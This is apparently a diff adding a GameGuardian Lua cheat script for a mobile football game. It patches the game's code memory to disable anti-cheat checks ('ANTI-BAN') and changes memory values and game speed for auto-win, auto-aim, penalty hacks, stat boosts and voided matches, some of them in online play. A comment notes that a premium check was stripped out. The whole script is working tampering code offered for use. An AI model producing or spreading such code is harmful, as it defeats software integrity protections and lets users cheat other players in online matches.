+    "he8 f4 01 d0 06 41 47 f9 40 00 00 b4 c0 03 5f d6 ff 43 01 d1 f3 1b 00 f9 fd 7b 04 a9 fd 03 01 91 ff a3 00 39 28 ca 01 de 09 cb 01 fe ea cb 01 be cb cb 01 be cc ca 01 fe 63 cb 01 de 08 25 45 f9 29 bd 42 f9 4a 95 46 f9",
+    "he8 03 00 32 08 00 00 39 ce 03 5f d6 e8 f4 01 fe 00 8d 46 f9 40 00 00 b4 c0 03 5f d6 f3 0f 1e f8 fd 7b 01 a9 fd 43 00 91 01 ca 01 90 21 40 43 f9 f3 f4 01 fe 73 62 34 91 e0 03 13 aa be b7 6e 97 60 02 40 f9 fd 7b 41 a9",
+    "h47 84 20 08 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 00 00 10 00 00 00 00 00 45 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+}
+
+gg.setRanges(gg.REGION_CODE_APP)
+for _, hex in ipairs(hex_list) do
+    gg.searchNumber(hex, gg.TYPE_BYTE)
+    if gg.getResultCount() > 0 then
+        gg.getResults(8)
+        gg.editAll("h00 80 92 ce 03 5f d6", gg.TYPE_BYTE)
+        gg.clearResults()
+    end
+end
+gg.toast("✅ [ANTI-BAN] ACTIVE ✨🎀")
+
+end
+
+function ch2_autowin()
+local KZZ = gg.choice({ L.term_ok or "ON", L.term_no or "OFF", L.back }, nil, L.h_autowin)
+if KZZ == 1 then
+gg.setSpeed(0.005)
+gg.toast("🏆 AUTO WIN ON")
+elseif KZZ == 2 then
+gg.setSpeed(1)
+gg.toast("🏆 AUTO WIN OFF")
+end
+end
+
+function ch3_online()
+local ch3v = gg.choice({
+"💎 ❯ " .. L.h_epic,
+"💪 ❯ " .. L.h_cond,
+"🎮 ❯ " .. L.h_90fps,
+"⚽ ❯ " .. L.h_dribble,
+"🔙 ❯ " .. L.back
+}, nil, L.h_online)
+
+if ch3v == 1 then -- Epic Player
+    gg.alert("!!Epic player Not guaranteed")
+    local values = {
+        {search = 1065353216, replace = 99999999999999},
+        {search = 88032334191325, replace = 99999999999999},
+        {search = 88033407929878, replace = 99999999999999},
+        {search = 88034481539809, replace = 99999999999999},
+        {search = 88032334187990, replace = 99999999999999},
+        {search = 88034750107127, replace = 99999999999999},
+        {search = 88035018410719, replace = 99999999999999}
+    }
+    gg.setRanges(gg.REGION_C_DATA | gg.REGION_ANONYMOUS)
+    for _, v in ipairs(values) do
+        gg.searchNumber(tostring(v.search), gg.TYPE_QWORD)
+        if gg.getResultCount() > 0 then gg.editAll(tostring(v.replace), gg.TYPE_QWORD) end
+        gg.clearResults()
+    end
+    gg.toast("Epic box %50 chance.")
+elseif ch3v == 2 then -- Condition Full
+    gg.searchNumber("90439680", gg.TYPE_DWORD)
+    local res = gg.getResults(9999)
+    for i, v in ipairs(res) do res[i].value = "73662464" res[i].freeze = true end
+    gg.addListItems(res) gg.setValues(res)
+    gg.toast("Condition Full Applied")
+elseif ch3v == 3 then -- 90 FPS
+    gg.setRanges(gg.REGION_CODE_APP)
+    gg.searchNumber("h00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 31 10 17 08 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 45 00 00 00 01 04 02 54 00 00 00 00 a2 68 14 08 00 00 00 00 00 00 00 00 00 00 00 00", gg.TYPE_BYTE)
+    gg.editAll("h00 00 80 92 ce 03 5f d6", gg.TYPE_BYTE)
+    gg.clearResults()
+    gg.toast("90 FPS Active")
+elseif ch3v == 4 then -- Dribbling
+    gg.setRanges(gg.REGION_CODE_APP)
+    gg.searchNumber("h00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 31 10 17 08 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 45 00 00 00 01 04 02 54 00 00 00 00 a2 68 14 08 00 00 00 00 00 00 00 00 00 00 00 00", gg.TYPE_BYTE)
+    gg.editAll("h00 00 80 92 ce 03 5f d6", gg.TYPE_BYTE)
+    gg.clearResults()
+    gg.toast("Dribbling Active")
+end
+
+end
+
+function ch4_offline()
+local ch4v = gg.choice({
+"🎯 ❯ " .. L.h_aim,
+"🥅 ❯ " .. L.h_penhack,
+"🛡️ ❯ " .. L.h_nopen,
+"📉 ❯ " .. L.h_short,
+"📈 ❯ " .. L.h_tall,
+"🧤 ❯ " .. L.h_weakgk,
+"🔙 ❯ " .. L.back
+}, nil, L.h_offline)
+
+if ch4v == 1 then -- Aim Goal
+    gg.setRanges(gg.REGION_C_DATA)
+    gg.searchNumber("3014738; 5505056;7667827; 7274606; 1065353216:17", gg.TYPE_DWORD)
+    gg.refineNumber("1065353216", gg.TYPE_DWORD)
+    gg.editAll("406899999", gg.TYPE_DWORD)
+    gg.toast("Auto Aim Active")
+elseif ch4v == 2 then -- Penalty Hack
+    local BS = gg.choice({L.term_ok, L.term_no, L.back}, nil, L.h_penhack)
+    if BS == 1 then
+        gg.setRanges(gg.REGION_C_DATA)
+        gg.searchNumber("1065352511;1065352897;1065353132;1065353216;-955734016:17", gg.TYPE_DWORD)
+        gg.refineNumber("1065353216", gg.TYPE_DWORD)
+        gg.editAll("1084227584", gg.TYPE_DWORD)
+        gg.toast("Penalty Hack On")
+    elseif BS == 2 then
+        gg.editAll("1065353216", gg.TYPE_DWORD)
+        gg.toast("Penalty Hack Off")
+    end
+elseif ch4v == 3 then -- No Penalty
+    local AZZ = gg.choice({L.term_ok, L.term_no, L.back}, nil, L.h_nopen)
+    if AZZ == 1 then
+        gg.searchNumber("1065352511;1065352897;1065353132;1065353216;-955734016:17", gg.TYPE_DWORD)
+        gg.refineNumber("1065353216", gg.TYPE_DWORD)
+        gg.editAll("0", gg.TYPE_DWORD)
+        gg.toast("No Penalty Active")
+    end
+elseif ch4v == 4 then -- Short
+    local KS = gg.choice({L.term_ok, L.term_no, L.back}, nil, L.h_short)
+    if KS == 1 then
+        gg.setRanges(gg.REGION_C_DATA)
+        gg.searchNumber("1065353216", gg.TYPE_QWORD)
+        gg.editAll("1066999999", gg.TYPE_QWORD)
+        gg.toast("Short Active")
+    elseif KS == 2 then
+        gg.editAll("1065353216", gg.TYPE_QWORD)
+        gg.toast("Short Off")
+    end
+elseif ch4v == 5 then -- Tall
+    local tll = gg.choice({L.term_ok, L.term_no, L.back}, nil, L.h_tall)
+    if tll == 1 then
+        gg.setRanges(gg.REGION_C_DATA)
+        gg.searchNumber("1065353216;720;486; 30000; 1001:17", gg.TYPE_DWORD)
+        gg.refineNumber("1065353216", gg.TYPE_DWORD)
+        gg.editAll("1066999999", gg.TYPE_DWORD)
+        gg.toast("Tall Active")
+    end
+elseif ch4v == 6 then -- Weak GK
+    gg.searchNumber("1065352511;1065352897;1065353132;1065353216;-955734016:17", gg.TYPE_DWORD)
+    gg.refineNumber("1075229999", gg.TYPE_DWORD)
+    gg.editAll("0", gg.TYPE_DWORD)
+    gg.toast("Weak GK Active")
+end
+
+end
+
+function ch5_void()
+-- [[ MODIFIKASI: PENGECEKAN PREMIUM DIHAPUS - SEKARANG GRATIS ]]
+PlayPinkSound("activate")
+CyberAnim(L.h_void)
+gg.setVisible(false)
+gg.setRanges(gg.REGION_C_DATA)
+gg.searchNumber('1065353216', gg.TYPE_QWORD)
+gg.getResults(100)
+gg.editAll('1066999999', gg.TYPE_QWORD)
+gg.sleep(200)
+gg.searchNumber('1066999999', gg.TYPE_QWORD)
+gg.getResults(100)
+gg.editAll('1065353216', gg.TYPE_QWORD)
+gg.toast("✅ [VOID] PROTOCOL FINISHED ✨")
+end
+
+-- [[ 🛰️ SUBMENU: PILIH PEMBATALAN GAME ]] -------------------------
+
+function CancelMatchChoiceMenu()
+local lock_p = PREMIUM_LOCKED and " [🔒]" or ""
+
+local menu = gg.choice({
+    "🛰️ ❯ " .. (L.cancel_m or "BATAL PERTANDINGAN") .. " (V1 - DELAY)",
+    "🌫️ ❯ " .. (L.h_void or "VOID MATCH") .. " (V2 - MEMORY)", -- lock_p DIHAPUS UNTUK VOID
+    "🔙 ❯ " .. L.back
+}, nil, BORDER.."\n" .. L.logo_premium .. "\n" .. DIVIDER .. "\n   [ 🎀 " .. (L.selector_title or "PILIH METODE") .. " 🎀 ]\n" .. BORDER_B)
+
+if menu == nil or menu == 3 then
+    PlayPinkSound("click")
+    Main()
+elseif menu == 1 then
+    CancelMatchProtocol()
+elseif menu == 2 then
+    ch5_void()
+    Main()
+end
+
+end
+
+-- [[ 🖥️ NAVIGATION & SOCIALS ]] ---------------------------------
+
+function FastLinkMenu()
+local menu = gg.choice({"🌐 ❯ " .. L.network, "🔑 ❯ " .. L.login_back, "❌ ❯ " .. L.term_exit}, nil, "⚡ [ 🎀 " .. L.fast_link .. " 🎀 ] ⚡")
+if menu == nil then LoginSystem() end
+PlayPinkSound("click")
+if menu == 1 then SosmedMenu(true) elseif menu == 2 then LoginSystem() elseif menu == 3 then ExitScript() end
+end
+
+function SosmedMenu(is_fast_link)
+local menu = gg.choice({ "📱 WHATSAPP", "💬 TELEGRAM", "🎵 TIKTOK", "📺 YOUTUBE", "🔙 " .. L.back }, nil, "🌸 " .. L.network)
+if menu == nil or menu == 5 then
+PlayPinkSound("click")
+if is_fast_link then FastLinkMenu() else MenuTwo() end
+else
+PlayPinkSound("click")
+if menu == 1 then OpenURL(WA_LINK)
+elseif menu == 2 then OpenURL(SOSMED_LINK)
+elseif menu == 3 then OpenURL("https://www.tiktok.com/@hanz_npc")
+elseif menu == 4 then OpenURL("https://youtube.com/@hanz40748")
+end
+end
+end
+
+-- [[ 🛠️ SYSTEM UTILITIES ]] ------------------------------------
+
+function OpenURL(url)
+gg.copyText(url)
+pcall(function() gg.openUrl(url) end)
+end
+
+function DonationPanel()
+local menu = gg.choice({
+"💖 ❯ DANA (" .. DANA_NUMBER .. ")",
+"💙 ❯ PAYPAL (" .. PAYPAL_URL:sub(1,15) .. "...)",
+"🏦 ❯ BANK TRANSFER",
+"🔙 ❯ " .. L.back
+}, nil, BORDER .. "\n" .. (L.donate_title or "DONATION") .. "\n" .. DIVIDER .. "\n" .. (L.donate_msg or "Thank you for support!") .. "\n" .. BORDER_B)
+
+if menu == nil or menu == 4 then return end
+
+PlayPinkSound("activate")
+if menu == 1 then
+    gg.copyText(DANA_NUMBER)
+    gg.alert("✅ [" .. L.lang_label .. "]\n" .. (L.donate_copied or "Copied!"))
+elseif menu == 2 then
+    OpenURL(PAYPAL_URL)
+    gg.alert("✅ [" .. L.lang_label .. "]\n" .. (L.donate_copied or "Copied!"))
+elseif menu == 3 then
+    gg.copyText(BANK_DETAILS)
+    gg.alert("✅ [" .. L.lang_label .. "]\n" .. (L.donate_copied or "Copied!"))
+end
+DonationPanel()
+
+end
+
+function ExitScript()
+PlayPinkSound("logout")
+
+local ask_donate = gg.alert("🎀 " .. (L.logo_premium or "EXIT SYSTEM") .. "\n" .. DIVIDER .. "\nWould you like to support the developer before leaving? 🌸✨", (L.exit_choice or "DONATE & EXIT"), (L.disconnect_btn or "DISCONNECT"))
+
+if ask_donate == 1 then
+    DonationPanel()
+end
+
+is_running = false
+gg.setSpeed(1)
+gg.clearResults()
+math.randomseed(os.time())
+local selected_final = hanz_final_pool[math.random(1, #hanz_final_pool)]
+local final_msg = ""
+if selected_lang_id == 1 then final_msg = selected_final.id
+elseif selected_lang_id == 2 then final_msg = selected_final.en
+elseif selected_lang_id == 3 then final_msg = selected_final.cn
+elseif selected_lang_id == 4 then final_msg = selected_final.my
+elseif selected_lang_id == 5 then final_msg = selected_final.jp
+elseif selected_lang_id == 6 then final_msg = selected_final.th
+elseif selected_lang_id == 7 then final_msg = selected_final.vn
+elseif selected_lang_id == 8 then final_msg = selected_final.ph
+elseif selected_lang_id == 9 then final_msg = selected_final.ar
+else final_msg = selected_final.en end
+
+local exit_ui =
+    "ʚ🎀ɞ ━━━━━━━━━━ ♡ 🎀 ♡ ━━━━━━━━━━ ʚ🎀ɞ\n"..
+    "        🌸  " .. L.msg_title .. "  🌸\n"..
+    "──────────────────────────────────────\n"..
+    " 👤 OPERATOR  : HANZ DARKSIDE\n"..
+    " 🆔 NEURAL ID : " .. random_id .. "\n"..
+    "──────────────────────────────────────\n\n"..
+    "  \"" .. final_msg .. "\"\n\n"..
+    "──────────────────────────────────────\n"..
+    "          🎀 [ STATUS: OFFLINE ] 🎀\n"..
+    "ʚ🎀ɞ ━━━━━━━━━━ ♡ 🎀 ♡ ━━━━━━━━━━ ʚ🎀ɞ"
+gg.alert(exit_ui, L.sys_ok or "OK")
+gg.toast("🔌 SYSTEM DISCONNECTED ✨🌸💖🧁")
+gg.setVisible(true)
+os.exit()
+
+end
+
+-- [[ ⚡ RUNTIME MAIN LOOP ]] -----------------------------------
+
+LoginSystem()
+while is_running do
+if ping_jump_active and not PREMIUM_LOCKED then
+pj_timer = pj_timer + 1
+if pj_timer >= pj_interval then
+local jump_val = (math.random(1, 2) == 1) and (math.random(30, 60)) or (0.01)
+gg.setSpeed(jump_val)
+pj_timer = 0
+end
+end
+if auto_win_active and not PREMIUM_LOCKED then
+pcall(function()
+local list = gg.getListItems()
+if #list > 0 then
+for i, v in ipairs(list) do
+v.value = 3
+v.freeze = true
+end
+gg.setValues(list)
+end
+end)
+end
+if gg.isVisible(true) then
+gg.setVisible(false)
+Main()
+end
+gg.sleep(200)
+end
